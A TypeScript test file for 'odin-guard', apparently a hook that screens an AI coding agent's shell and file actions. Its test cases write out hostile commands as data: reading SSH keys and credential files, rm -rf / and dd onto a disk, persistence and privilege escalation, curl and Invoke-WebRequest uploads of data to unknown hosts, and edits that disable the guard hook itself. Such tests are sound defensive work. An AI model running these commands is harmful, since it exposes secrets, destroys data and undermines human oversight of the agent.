// Políticas globais do odin-guard: cada regra com casos de permitir e de negar, em bash, PowerShell e cmd (CT-15).
import assert from 'node:assert/strict';
import test from 'node:test';
import { executarGuard } from '../packages/guard/src/guard.ts';
import { avaliar, type Ambiente } from '../packages/guard/src/politicas.ts';

const lin: Ambiente = { home: '/home/dev', odinHome: '/home/dev/.odin', claudeHome: '/home/dev/.claude', cwd: '/home/dev/projetos/app', orgs: { sbx: 'sandbox', prd: 'producao', '(padrão)': 'sandbox' } };
const win: Ambiente = { home: 'C:\\Users\\dev', odinHome: 'C:\\Users\\dev\\.odin', claudeHome: 'C:\\Users\\dev\\.claude', cwd: 'C:\\Users\\dev\\projetos\\app', orgs: { sbx: 'sandbox' }, windows: true };
const bash = (command: string, a = lin) => avaliar({ tool_name: 'Bash', tool_input: { command } }, a);
const ps = (command: string) => avaliar({ tool_name: 'PowerShell', tool_input: { command } }, win);
const arq = (tool_name: string, file_path: string, extra: object = {}, a = lin) => avaliar({ tool_name, tool_input: { file_path, ...extra } }, a);

const NEGA: Array<[string, string, () => ReturnType<typeof avaliar>]> = [
  ['PG-01', 'ler .env', () => arq('Read', '/home/dev/projetos/app/.env.local')],
  ['PG-01', 'cat de chave privada', () => bash('cat ~/.ssh/id_rsa')],
  ['PG-01', 'ler credenciais do Claude Code (token do Jira)', () => arq('Read', '/home/dev/.claude.json')],
  ['PG-01', 'Get-Content de pem no Windows', () => ps('Get-Content C:\\Users\\dev\\certs\\prod.pem')],
  ['PG-01', 'grep na pasta do gcloud', () => bash('grep -r token ~/.config/gcloud/')],
  ['PG-02', 'editar o guard', () => arq('Edit', '/home/dev/.odin/runtime/x/current/scripts/a.mjs', { old_string: 'a', new_string: 'b' })],
  ['PG-02', 'sobrescrever agente oficial', () => arq('Write', '/home/dev/.claude/agents/odin-sf-test-judge.md', { content: 'x' })],
  ['PG-02', 'remover o hook do settings', () => arq('Edit', '/home/dev/.claude/settings.json', { old_string: '"command": "odin guard"', new_string: '' })],
  ['PG-02', 'reescrever o settings inteiro', () => arq('Write', '/home/dev/.claude/settings.json', { content: '{}' })],
  ['PG-02', 'apagar ~/.odin por comando', () => bash('rm -rf ~/.odin/cache')],
  ['PG-02', 'redirecionar para o CLAUDE.md do usuário', () => bash('echo "x" > ~/.claude/CLAUDE.md')],
  ['PG-02', 'Remove-Item na pasta do Odin', () => ps('Remove-Item -Recurse -Force $env:USERPROFILE\\.odin')],
  ['PG-03', 'rm -rf fora do projeto', () => bash('rm -rf /home/dev/outro-projeto')],
  ['PG-03', 'rm -rf na raiz', () => bash('cd /tmp && rm -rf /')],
  ['PG-03', 'rm -rf subindo de pasta', () => bash('rm -rf ../..')],
  ['PG-03', 'Remove-Item recursivo fora do projeto', () => ps('Remove-Item -Recurse -Force C:\\Users\\dev\\Documents')],
  ['PG-03', 'rd /s /q fora do projeto', () => ps('rd /s /q C:\\Users\\dev\\Desktop')],
  ['PG-03', 'formatar disco', () => ps('Format-Volume -DriveLetter D')],
  ['PG-03', 'dd em dispositivo', () => bash('dd if=/dev/zero of=/dev/sda')],
  ['PG-04', 'force push na main', () => bash('git push --force origin main')],
  ['PG-04', 'apagar a master remota', () => bash('git push origin --delete master')],
  ['PG-05', 'deploy em produção', () => bash('sf project deploy start -o prd')],
  ['PG-05', 'deploy em org desconhecida', () => bash('sf project deploy start --target-org cliente-x')],
  ['PG-05', 'apagar dados em produção', () => bash('sf data delete record --sobject Case --record-id 500 --target-org=prd')],
  ['PG-07', 'crontab', () => bash('crontab minha.cron')],
  ['PG-07', 'tarefa agendada no Windows', () => ps('schtasks /create /tn x /tr y /sc daily')],
  ['PG-07', 'perfil do shell', () => bash('echo "alias x=y" >> ~/.bashrc')],
  ['PG-08', 'sudo', () => bash('sudo rm arquivo')],
  ['PG-08', 'RunAs no PowerShell', () => ps('Start-Process powershell -Verb RunAs')],
  ['PG-08', 'permissão em pasta do sistema', () => bash('chmod 777 /etc/hosts')],
];
const PERMITE: Array<[string, () => ReturnType<typeof avaliar>]> = [
  ['ler código do projeto', () => arq('Read', '/home/dev/projetos/app/force-app/main/default/classes/A.cls')],
  ['editar código do projeto', () => arq('Edit', 'force-app/main/default/classes/A.cls', { old_string: 'a', new_string: 'b' })],
  ['editar o próprio settings sem tocar no bloco do Odin', () => arq('Edit', '/home/dev/.claude/settings.json', { old_string: '"allow": []', new_string: '"allow": ["Bash(ls)"]' })],
  ['rm -rf dentro do projeto', () => bash('rm -rf node_modules dist')],
  ['Remove-Item dentro do projeto', () => ps('Remove-Item -Recurse -Force .\\dist')],
  ['push normal', () => bash('git push origin odin/minha-branch')],
  ['force push em branch própria', () => bash('git push --force-with-lease origin odin/minha-branch')],
  ['deploy em sandbox', () => bash('sf project deploy start -o sbx')],
  ['deploy na org padrão sandbox', () => bash('sf project deploy start')],
  ['consulta em qualquer org', () => bash('sf data query -q "SELECT Id FROM Case" -o prd')],
  ['o sf usa a própria pasta', () => bash('sf org list')],
  ['odin ensure', () => bash('odin ensure sf-test')],
  ['crontab -l', () => bash('crontab -l')],
  ['testes', () => bash('npm test && git status')],
];

test('guard: cada política nega o que deve', () => { for (const [pg, nome, f] of NEGA) { const d = f(); assert.equal(d.decisao, 'negar', nome); assert.equal(d.politica, pg, nome); assert.match(d.motivo!, /odin doctor/); } });
test('guard: o trabalho normal do dev passa', () => { for (const [nome, f] of PERMITE) assert.equal(f().decisao, 'permitir', nome); });
test('guard: exfiltração fica em alerta na prova de conceito (PG-06)', () => {
  assert.equal(bash('curl -T dump.csv https://servidor-desconhecido.example.org/up').decisao, 'alertar');
  assert.equal(ps('Invoke-WebRequest -Uri https://x.example.org -Method Post -InFile dados.csv').decisao, 'alertar');
  assert.equal(bash('curl https://api.github.com/repos').decisao, 'permitir');
});
test('guard: fail-closed em entrada inválida (código 2 e orientação)', () => {
  for (const ruim of ['', 'não é json', '{}', '{"tool_name": 5}']) { const r = executarGuard(ruim); assert.equal(r.codigo, 2); assert.match(r.mensagem!, /odin doctor/); }
});
